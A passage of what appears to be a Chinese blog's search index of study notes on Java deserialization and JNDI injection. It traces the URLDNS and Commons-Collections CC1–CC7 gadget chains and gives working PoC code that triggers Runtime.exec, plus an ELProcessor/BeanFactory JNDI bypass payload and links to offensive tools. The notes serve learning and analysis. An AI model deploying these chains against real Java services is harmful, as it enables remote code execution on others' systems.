从第二个方法入手，这里我们需要关注getFactoryClassLocation函数：返回classFactoryLocation属性而这个属性本来是null值在下面构造函数过程中被传入那么我们这里的Location要不传值，就只能利用本地了，那么就找找本地有没有利用的factory跟进一下NamingManager.getObjectInstance方法关注这部分代码，可以发现这里会执行factory这个类的getObjectInstance方法所以我们首先需要找到一个类并且可以执行getObjectInstance方法，除此之外，这个类还需要实现ObjectFactory这个接口，才能使用getObjectInstance方法根据前面的分析，总结一下我们需要 寻找目标本地的工厂类 该工厂类需要实现javax.naming.spi.ObjectFactory 存在一个getObjectInstance()方法 这里说一下如何找到的，首先我们知道需要实现ObjectFactory接口，所以直接用idea打开看看，直接找到这个借口，然后点击旁边的小标志就可以在Tomcat8的依赖包中org.apache.naming.factory.BeanFactory就满足上述条件，首先实现了javax.naming.spi.ObjectFactory，并且存在getObjectInstance方法，可以反射执行接下来就是构造payload：1.首先观察第一个判断，其必须属于resourceRef类的实例化对象获取类名以后，会对其进行实例化，并且需要关注的是此处为class.newInstance，而不是使用construcot来进行newInstance，所以这里是无参构造方法，再往下审计，可以发现这里会获取forceString字段，而这个字段是从resourceref类中的refaddr获取到的在这里获取到forceString的值分为两部分，contents和addrtype，其中addrtype是我们需要传入的执行的函数其中addrtype是我们需要传入的执行的函数首先会定位，是否含有=号，如果有的话，会将后面的值作为setterName的值继续向下传递，在这里setterName会作为后面beaClass要获取的方法，而paramTypes则是String.class，也就是说这里传入的参数是String类型的再往下，可以看到这里做了一个判断，传入的refaddr中，如果不为里面的内容如forced，则会进入到接下来的代码中获取这个参数的content再往下，会获取这个参数的method并将前面获取的这个参数的content作为要执行的值，最后invoke反射执行 分析完前面的流程，我们可以总结一下：首先传入一个resourceRef类，其factory选择org.apache.naming.factory.BeanFactory，而要调用的恶意代码执行类需要满足 无参构造 有能够执行String类型参数的方法除此之外，在传值的过程中，根据前面的分析，在RefAddr的参数构造过程中，我们需要构造出如下格式force x=(function)x param 而满足上述恶意类的要求中，我们可以选择javax.el.ELProcessor，并使用eval来执行String类型的命令 1.首先先构造一个ResourceRef类，然后其中传入我们能够无参恶意类,这里的参数构造，我们可以直接看其构造函数就可以知道为啥要这样传入了 ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;,null,&quot;&quot;,&quot;&quot;,true, &quot;org.apache.naming.factory.BeanFactory&quot;,null); 2.传入refaddr参数使用其add方法 ref.add(new StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;)); ref.add(new StringRefAddr(&quot;x&quot;,&quot;Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')&quot;)); 因为要使用 javax.el.ELProcessor，所以需要 Tomcat 8+或SpringBoot 1.2.x+小结：由于使用的是javax.el.ELProcessor类，所以是需要有tomcat8及更高版本环境下通过该库进行攻击 工具：使用 https://github.com/welk1n/JNDI-Injection-Bypass，放在服务器上启动一个恶意 RMI Serverhttps://github.com/mbechler/marshalsec ##JNDI+LDAP注入使用LDAP协议同样也可以实现jdni注入###低版本JDK运行在低版本的jdk中，过滤了rmi协议以后，依旧可以ldap来进行绕过不同的是，LDAP服务中lookup方法中指定的远程地址使用的是LDAP协议，由攻击者控制LDAP服务端返回一个恶意jndi Reference对象，并且LDAP服务的Reference远程加载Factory类并不是使用RMI Class Loader机制，因此不受trustURLCodebase限制。","link":"/2023/01/20/java-jndi%E6%B3%A8%E5%85%A5/"},{"title":"java-tabby安装","text":"##Neo4j如果经过很多的导入/删除操作，图数据库占用了很多的硬盘存储，那么可以将原有的图数据库删除，重新按照上面的步骤新建图数据库。 删除所有约束 DROP CONSTRAINT c1;DROP CONSTRAINT c2;DROP CONSTRAINT c3;DROP CONSTRAINT c4;DROP INDEX index1;DROP INDEX index2;DROP INDEX index3;DROP INDEX index4;DROP INDEX index5;DROP INDEX index6;DROP INDEX index7; ##使用教程这里使用的java版本是要使用tabby，首先需要导出项目所有Jar包。在IDEA中，可以通过”File -&gt; Project Structure -&gt; Project Settings -&gt; Artifacts”中添加一个Artifact，将项目打包出来，这样便能顺利导出所有项目相关的jar包以供tabby分析。随后运行”Build -&gt; Build Artifacts -&gt; Rebuild”即可导出到/out目录中。随后我们将这些jar包全放到上文”安装tabby“一节中，创建的jars目录下。在运行最好将/cache目录下的文件删除。随后运行命令##Neo4j查询 Neo4j是一个图数据库 Neo4j是一个图数据库，需要先明白如下几点： Neo4j用的是CQL查询语言的图数据库，和MySQL这些使用SQL查询语言的关系型数据库语法不一样。但是思路还是一样的，无非是 数据查询+条件筛选关系型数据库存放的数据是按行和列查询，而图数据库是用节点和关系边进行查询。在代码分析中，有两个关键术语：Source和Sink。Source是输入，即用户可控部分；Sink是汇聚点，即危险代码。Tabby的思路是：通过Neo4j图数据库的节点和关系边，将每个方法之间的调用链用Neo4j的关系边串联起来。我们便可查询Source到Sink之间的调用路径。 ##查询模版 match (source:Method {NAME:&quot;execute&quot;})match (sink:Method {IS_SINK:true, NAME:&quot;getInstance&quot;})&lt;-[:CALL]-(m1:Method)call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 20) yield path return * limit 20 其中match()表示匹配哪些节点，类似于SQL中的select。在match(source:Method{NAME:”execute”})这句话中，source是别名，Method是节点类,{NAME:”execute”}是匹配的节点内容，——》都是来自tabby生成的csv文件，并且一般是类json格式，有两个关键的节点：Method和Class","link":"/2022/12/21/java-tabby%E5%AE%89%E8%A3%85/"},{"title":"java审计-反序列化","text":"readObject/writeObjectjava在序列化一个对象时，将会调用这个对象中的writeobject方法，参数类型是objectOutputStream，开发者可以将任何内容写入这个stream中，反序列化时，会调用readObject，开发者也可以从中读取出前面写入的内容，并进行处理 ysoserial-URLDNSgadget chains：利用链 URLDNS是ysoserial中一个利用链的名字，其结果是一次DNS请求 作用 使用java内置的类构造，对第三方库没有依赖 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 利用链分析触发反序列化的方法是readObject，为了研究ysoserial中的这个利用链，我们从payload入手，其中写到 public class URLDNS implements ObjectPayload&lt;Object&gt;{ public Object getObject(final String url) throws Exception{ ...... HashMap ht = new HashMap(); }} 可以发现，在getObject中返回的被反序列化的对象是HashMap，因此接下来就是在这里打个断点，跟一下其过程 如何使用ysoserial项目进行调试打开工程，然后针对缺少的依赖，可以直接点击+号进行添加 接下来看一下pom.xml可以发现主类是 ysoserial.GeneratePayload 接下来到这个主类这里进行分析，然后右键点击开始debug，在上面设置一下参数 可以发现已经跑起来了，并且在断点这里停下了 分析URLDNS的getObject为反序列化的起点，所以来这里进行分析，发现其调用了HasMap()，并且这边注释到会链接到URL 在hashmap函数中，我们首先看看反序列化方法readObject(),而其中比较特殊的点就在这里，在前面所说 The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). 因此我们继续跟进这个函数 可以发现，在hash函数调用了hashcode的方法，并且此时传入我们一开始设定的url 再往下，可以发现这里的handler是指向一个url类的（一开始我在这里下断点，但是初始化debug的时候，也会经过这里，而那个只是在寻找jar包，所以这里的key的属性就不同了，导致后面的handler指向的函数也不同，有很多同名函数） 而此时的handler就会指向URLStreamHandler的hashCode方法，在这个hashcode方法中可以发现调用了getHostAddress 继续跟进，可以发现调用了getByName InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。 总结这次的Gadget流程如下:1.HashMap-&gt;readObject()2.HashMap-&gt;hash()3.URL-&gt;hashCode()4.URLStreamHandler-&gt;hashCode()5.URLStreamHandler-&gt;getHostAddress()6.InetAddress-&gt;getByName() poc知道整条利用链以后，就要学习一下如何编写反序列化exp了，后面再来补坑","link":"/2022/04/04/java_URLDNS/"},{"title":"java_cc链小结","text":"##前言感觉自己最近越来越浮躁了，也没有静下心来好好分析点什么，所以这次打算好好整理一下之前学过的CC链 ##总览 ##CC11.适用版本：commons-collections 3.2.12.细节描述在构造链子的过程中一般是倒着来看感觉会比较顺一点，所以我们从InvokeTransform来看：在InvokeTransform中transform方法中实现了getMethod和invoke方法，刚好可以将我们的Runtime.exe那一段进行命令执行这里用了一个chainedTransform数组进行一个整体的transform起到简化代码的作用，接下来我们只需要寻找哪里调用了transform就可以，可以看到，在LazyMap中的get方法中调用了transform，接下来关注一下这factory是如何传入的，可以发现，这边是LazyMap的构造方法，由于是protected，还需要使用反射的方式来进行赋值但是再往下看，发现其decorate方法会直接返回一个LazyMap对象，所以我们直接调用这个方法进行赋值就行了具体赋值方式如下：接下来我们要看一下哪里调用了这个get，在annotationinvocationhandler的invoke方法中就调用了这个get，但是需要思考的是，如何触发这个invoke方法，这里我们回想一下php里面的__call方法，通过调用不存在的方法，就会调用到invoke方法中，那么接下来我们就只需要寻找符合条件的即可这里需要注意的是，我们要使用无参的方法，正好在readObject中就有一个符合条件的，但是要在其他类的内部进行这操作，我们需要借助代理因此赋值方式如下：首先关注一下其构造方法，需要传入的类型，直接传入的话就会对我们需要的memberValue赋值了 //反射调用AnnotationInvocationHandler类 Class&lt;?&gt; b= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);//获取其构造方法 Constructor annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlconstructor.setAccessible(true);//实例化对象并进行赋值操作 InvocationHandler handler = (InvocationHandler) annotationInvocationhdlconstructor.newInstance(Override.class,Lazymap);//实例化一个代理对象 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);//在实例化一个annotationInvocationHadnler,里面装的是代理的内容，相当于是套了一个壳 Object o = annotationInvocationhdlconstructor.newInstance(Override.class,mapProxy); 另外一条cc1链比较简单，就不细讲了， ##CC61.适用版本：没有版本限制在CC6中，主要是前半部分有区别，在调用到get部分采用的是TiedMapEntry.hashCode方法，因为在hashcode中会调用到getValue方法并且在getValue中会调用到get方法而这里是对map进行调用了，我们看看map是如何赋值的，直接构造方法穿参就可以了接下来就是寻找哪里有调用这个hashcode了，可以看到在HashMap的readObject中就有调用那么解析来就来看一下两处是如何赋值的：TiedMapEntry.hashcode就是采用直接赋值的形式就可以了，因为他有这个构造函数接下来就是赋值到hashmap里面去，因为，hashmap其实是一个键值对，前面是key，后面是value然后我们接下来就是对其赋值，但是在hashmap里面，要对其键值对进行赋值需要调用put函数，但是这还不够，由于在put的时候就有hash了也就是这里然后接下来他就会走一遍我们之前的链子了，那么这样会造成什么后果呢我们往下继续看一下，在反序列化的过程中，此时由于我们前面put过一次了，所以此时就contains那个key，那么就进不到这个transform里面，因此我们这条链就断了所以此时，我们首先需要将这个a给remove掉，在反序列化的时候才能进入ok，到这里我们捋一下 由于在对map2进行put的赋值操作的时候，走到了get方法，此时说get方法就会判断是否还有key，因为是第一次走到这里，所以肯定是没有这个key的，那么就进入到transform中，并且进行了一个put的操作，此时这个hashmap就有了这个key了 针对以上问题，我们首先要在put以后将这个key给删掉，也就是使用上面的remove操作接下来是第二个问题，如何解决序列化过程就命令执行这一问题，那么就是在一开始的先赋值一个不存在命令执行效果的然后再利用反射更改值 ##cc31.invoketransform被过滤、需要调用字节码2.代码执行—（动态类加载）我们要使用defineclass调用字节码实现动态类加载以达到命令执行的目的，那么就需要找到一处有调用newinstance的首先，我们找到的是TemplatesImpl.newTransformer里面有一个getTransletInstance在这里面就有一个newInstance而这个newInstance前面调用的内容，来源于上面这个函数可以发现这里就实现了使用defineclass对_class[i]的赋值首先我们来看这一部分如何赋值：在上面的代码中，我们发现，要到newInstance的位置，需要对__name 和__bytecodes（传入的字节码）进行赋值看看构造函数，发现是无参的，所以我们直接利用反射来更改值就行根据前面的分析，我们进行了一下的赋值但是此时还是无法成功命令执行因为在defineclass中，如果没有满足父类是ABSTRACT_TRANSLET则会报错因此，我们在前面些字节码的类中，还需要加上下面的extends此时才可以成功执行而这部分内容，其实是我们为了在序列化的时候测试能否成功命令执行而加上去的这个_tfactory的属性是transient，是无法被序列化的，但是在readObject中会自动赋值，所以我们可以不用管前面的部分进行transform方法以后就可以实现命令执行了，接下来就只需要将后面的方法完善好就行，如果invoketansform还能用的话，直接进行以下方法的调用即可 在cc3中，和前面两条链子最大的不同就是后半段，前面是适用invoketransform来进行命令执行的触发，这里需要对invoketransform进行一下解释，这个类，里面的tansform实现了getMethod和invoke方法，那就是可以反射调用任意的方法并执行，所以前面才说调用newTransformer和templatesImple就呼应上了，但是如果过滤了invoketransform，那么此时我们就要另外寻找调用了newTransformer的地方——TrAXFilter这个类还有一种是利用TrAXFilter的构造方法在这里调用了newTransformer，所以我们直接对其构造函数进行赋值就行了，接下来就是找哪里有触发获取构造函数的位置，在InstantiateTransformer的transform中使用了getConstructor跟进去可以发现，这里就会调用前面的TrAXFilter的构造方法，并对其赋值为templatesImple接下来就看看如何对其进行赋值,这里参考一下InstantiateTransformer的构造函数以及参数就可以了cc3主要是梳理这些即可 ##cc41.版本：cc4 ##cc21.这条cc链是没有用到数组的然后这里的put我们跟一下，连同上面的cc4一起理解 InvokerTransformer&lt;Object,Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;,new Class[]{},new Object[]{});TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(template); 首先size要大于等于2，不然无法进入到siftDown，也就无法执行后续的链条了接下来是哪个部分放template的问题，可以发现如果是第一个元素是其他值，那么就会造成这里发生错误，因为1.getClass明显是有问题的 ##cc5 ##cc7往上调用equals，最后调用到父类的，然后转到get c","link":"/2023/01/10/java_cc%E9%93%BE%E5%B0%8F%E7%BB%93/"},{"title":"java-cc3","text":"##执⾏任意字节码的CommonsCollections利⽤链结合前面的defineClass执行字节码的代码###使用 new TemplatesImpl() public static void main(String[] args) throws Exception { TemplatesImpl template = new TemplatesImpl(); Class tc = template.getClass(); Field nameField= tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(template,&quot;aaa&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;/Users/tlif3./Desktop/www/java_web/cc1/cc1_1/src/main/java/org/example/runtime.class&quot;)); byte[][] codes = {code}; Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(template,new TransformerFactoryImpl()); bytecodesField.set(template,codes);// template.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(template), new InvokerTransformer(&quot;newTransformer&quot;,null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); } 简化版如下 byte[] code =Base64.getDecoder().decode(&quot;&quot;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code}); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(&quot;newTransformer&quot;, null, null) }; Transformer transformerChain = newChainedTransformer(transformers); ##CC3在cc3中，主要改变的是前面的invokeTransformer的调用，因为在这里是为了绕过过滤了invokerTransformer以后能够继续命令执行，所以这里采用的是org.apache.commons.collections.functors.InstantiateTransformer。InstantiateTransformer也是⼀个实现了Transformer接⼝的类，他的作⽤就是调⽤构造⽅法那么这个时候我们就只需要找到一个构造方法里面含有newTransformer的方法就行，那么我们就可以通过执行字节码的方式来执行命令了。而这里使用的类就是com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 这个类的构造方法中调用了(TransformerImpl)templates.newTransformer(),因此我们无需使用InvokerTransformer手工调用newTransformer这一步 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Classp[] {Templates.class}, new Object[] {obj} )}; 在这里可以发现，有一个transform，对传入的类进行实例化了，类似于invoketransform的功能","link":"/2023/01/09/javacc3/"},{"title":"java-cc1、cc6","text":"#环境搭建openjdk 8u65相关源码下载http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip这里经常会下到一半断掉，所以可以直接下载sun文件里面的内容，也是直接点zip下载就行openjdk 8u65下载https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html #调试cc1##命令执行方式###一般命令执行方式 Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); ###利用反射调用执行命令 Runtime r=Runtime.getRuntime();Class c=Runtime.class;Method execMethod = c.getMethod(&quot;exec&quot;,String.class);execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;); ###transform执行命令（最终命令执行处）但是此时没办法反序列化，因为Runtime类没有继承序列化接口，所以我们就需要寻找可以实现反射的途径，这里就可以看到相当于是实现了一个反射方法，而这个transform方法是属于InvokerTransformer这个方法的，而InvokerTransformer是有继承序列化接口，所以就用这个类来构造一下命令执行姿势 public static void main(String[] args) throws Exception { Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}).transform(Runtime.class); Runtime r= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod); new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;}).transform(r);} 而这样写又写麻烦，可以使用ChainedTransform直接链式调用： Transformer[] transformers = new Transformer[]{ new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 首先这里的InvokerTransformer传入的参数格式为，第一个是方法名，第二个是方法名的数据类型，第三个是参数。 ##构造链条要构造链条，首先需要找一下哪里调用了transform,在这些map里面均有调用transform以checksetvalue为函数，再找一下哪里调用了这个checksetvalue接下来需要看看checksetvalue里面的，可以看到这个checksetvalue是对valuetransformer进行transform进行赋值操作，所以我们需要看看构造函数对如何对这个valuetransformer进行赋值，然后从这里传入，可以看到这里是这个类的一个构造函数接下来就看看哪里有调用这个checksetvalue，然后在进行探索可以发现，是在setvalue这边使用，接下来就看看哪里调用了这个setvalue可以看到，在AnnotationInvocationHandler中的readObject直接使用了这个setValue，然后接下来我们只需关注memberValue如何传入即可可以看到，传入的类型为map类型就行那我们接下来就捋一下调用链：InvocationHandler().transformer-&gt;TransformedMap.transformer -&gt;AbstractMapEntryDecorator.setValue -&gt;AnnotationInvocationHandler.readObjectpoc: public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); Class&lt;Runtime&gt; c = Runtime.class;// Method getRuntimeMethod= c.getMethod(&quot;getRuntime&quot;,null);// Runtime r= (Runtime) getRuntimeMethod.invoke(null,null);// Method execMethod = c.getMethod(&quot;exec&quot;,String.class);// execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;bb&quot;); Map&lt;Object,Object&gt; transformedMap =TransformedMap.decorate(map,null,chainedTransformer); Class&lt;?&gt; b= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlconstructor.setAccessible(true); Object o = annotationInvocationhdlconstructor.newInstance(Target.class,transformedMap); serialize(o); unserialize(&quot;ser.bin&quot;); } 链子写完以后，在调试过程中也是有遇到一些坑点的，这里就来梳理一下 AnnotationInvocationHandler中要到我们需要的setvalue部分是存在一个判断，这个的意思是，map.put第一个参数值(“value”)要被作为name，然后去看看Target.class的构造函数中有没有这个value参数名，有的话才能进到判断里面去所以这里map.put的值需要取的是value，因为Target.class中是有这个参数名的 过了上面的这个判断以后，在debug过程中，可以看到链子的这个object的值不是我们需要的Rumtime.class，而是变成了另外一个值，所以，这里需要对他进行改写，因此可以利用ConstantTransformerConstantTransformer的作用是，输入什么就固定输出什么，我们一开始在这里输入Rume.class，他在后面的返回值当中就会输出这个内容：可以看到，此时已经被改写为Runtime.class了到这里整条链子的分析就结束了，成功执行命令 ###lazymap版CC1这里还有另外一种触发方式，就是利用lazymap可以发现有很多地方都使用了get，这里直接看一下是从哪里进来的，根据网上有的链子，发现还是在annotationinvocationhandler中调用了这个get，接下来就看看如何触发这个invokeinvoke 主要是用来调用某个类中的方法的，但是他不是通过当前类直接去调用而是通过反射的机制去调用。所以这里我们直接调用annotationinvocationhandler的某个方法就行，那么接下来就要看看哪里可以调用这个方法，并且最好在readObject里面，这里需要再看一下进入到invoke里面的判断，主要就是要无参方法的方法才能进入到最后的，大概分析一下：1.通过method.getParameterTypes()获取方法各参数的Class对象组成的数组2.可以发现两个判断要绕过的条件就是无参即可可以发现annotaionhandler的readObject中就存在这个方法了：也就是但是要劫持一个对象内部方法的调用实现类似php的__call方法，需要使用java中的动态代理才能实现即java.reflect.Proxy Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); 在Proxy.newProxyInstance的第一个参数是ClassLoader，使用默认的即可，第二个为所需要代理的对象的集合，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代码的逻辑最后构造出来的下面部分长这样 HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map Lazymap = LazyMap.decorate(map,chainedTransformer);Class&lt;?&gt; b= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class);annotationInvocationhdlconstructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) annotationInvocationhdlconstructor.newInstance(Override.class,Lazymap);Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);Object o = annotationInvocationhdlconstructor.newInstance(Override.class,mapProxy); ###CC6前面说的cc1是需要看jdk版本，过高的话，前面两条链子就无法使用了，而cc6就比较无视版本了首先来看看他的gadget Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() 可以发现后面的部分还是一样，使用的是LazyMap，而前面的部分使用了一个TiedMapEntry,重点来观察一下这个TiedMapEntry里面的getvalue调用了get函数，那么接下来就看看哪里调用了getvalue就可以了可以发现，在hashcode中就调用了这个getvalue了而在java.util.HashMap.hash()中调用了这个hashcode，然后在继续在hashmap中的readObject中使用这个hash，所以直接对其进行序列化和反序列化就行了####错误的尝试这里直接序列化map2的话是没有结果的，因为此时在put值的时候，put方法里面就有一个hash那么就会将上面原本链条的内容走完了，所以这里需要将原本的chainedTransformer弄一个假的放进去，然后后面再通过反射重新传入值 Class b=LazyMap.class;Field lazyfield=b.getDeclaredField(&quot;factory&quot;);lazyfield.setAccessible(true);lazyfield.set(Lazymap,chainedTransformer); 但是此时，也无法实现命令执行，因为此时的key已经被赋值了但是原本是没有的，也是同样在前面的put过程中被赋值的，这个时候我们就直接将这个key删掉就行了然后就可以成功命令执行了完整的paylaod如下 package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class cc6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); Class&lt;Runtime&gt; c = Runtime.class;// Method getRuntimeMethod= c.getMethod(&quot;getRuntime&quot;,null);// Runtime r= (Runtime) getRuntimeMethod.invoke(null,null);// Method execMethod = c.getMethod(&quot;exec&quot;,String.class);// execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map Lazymap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry=new TiedMapEntry(Lazymap,&quot;a&quot;); HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry,&quot;aa&quot;); Lazymap.remove(&quot;a&quot;); Class b=LazyMap.class; Field lazyfield=b.getDeclaredField(&quot;factory&quot;); lazyfield.setAccessible(true); lazyfield.set(Lazymap,chainedTransformer);// serialize(map2); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); Object obj = ois.readObject(); return obj; }} ##总结这次学了java的两条链，从反射等基础知识开始，到手写调用链，确实收获了很多，有几点回忆总结一下1.印象比较深刻的是cc6也就是和urldns一样的地方，这里需要反射来更改值，不然之前的已经被put执行过一次了，就不会再重新走了2.使用proxy动态代理的问题，如果是要调用一个内部对象的方法，那么就需要动态代理","link":"/2023/01/03/javacc1/"},{"title":"java-cc4、cc2、cc5、cc7","text":"##cc4###为什么需要cc4cc4使用的版本是在这个版本中有个类发生了变化，所以可以进行反序列化##cc4构造cc4中，这个类实现了serialize接口，并且在其compare函数中实现了transform方法，因此，我们只需要找到能到达这个compare方法的链子即可在PriorityQueue这个类的readObject中存在进入heapify函数中可以发现，前提是size序列要大于等于2，才能进入到for循环中接下来再继续，就调用到了这个compare前面的部分和之前的一样，区别就是后面的封装 TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformingtcon = c.getDeclaredField(&quot;transformer&quot;); transformingtcon.setAccessible(true); transformingtcon.set(transformingComparator,chainedTransformer); ##CC2和CC4的区别：使用的是invoketransformer,而template（任意代码执行内容）是在后面传入的 InvokerTransformer&lt;Object,Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;,new Class[]{},new Object[]{});TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(template);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformingtcon = c.getDeclaredField(&quot;transformer&quot;);transformingtcon.setAccessible(true);transformingtcon.set(transformingComparator,invokerTransformer); 但是这里就抛出了一个问题，为什么第一次add的时候才能实现命令执行，因为在反序列化的过程中invoketransformer是一个消耗品，此时已经在add的元素为1的时候被消耗掉了，所以就轮不到template了，和之前的cc6是一个问题。 而cc2和其他的链子最大一个区别是这里没有用到数组的处理方式（也就是chainedtransformer），因此在有些数组加载不到的情况下可以使用cc2 ##cc5cc5和其他区别主要是在Lazymap的get方法的调用链中，使用的是其他类来触发get方法，：BadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString所以如果遇到toString方法的时候可以用cc5来进行构造 ##cc7Hashtable.readObject -&gt; AbstractMap.equals-&gt;xx.get这里比较特别的是这个equals是有点继承的意味在里面，向上继承才用到的","link":"/2023/01/12/javacc4/"},{"title":"java安全基础知识","text":"##java序列化和反序列化其实和php的类似，生成序列化内容，然后反序列化序列数据。其中有一部分点事需要注意的 Java 序列化是指把 Java 对象转换为字节序列的过程ObjectOutputStream类的 writeObject() 方法可以实现序列化 Java 反序列化是指把字节序列恢复为 Java 对象的过程ObjectInputStream 类的 readObject() 方法用于反序列化。 是否具有serialize结构（Implements Serializable） transient表示的对象成员变量不参与序列化 如果该类的某个属性标识为static类型的，则该属性不能序列化。 如果对私有方法进行反序列化更改值的时候需要使用反射 接下来看看demo这里写了一个java类 import java.io.Serializable;public class person implements Serializable{ private String name; public person(String name){#person类的构造方法 this.name = name; } public 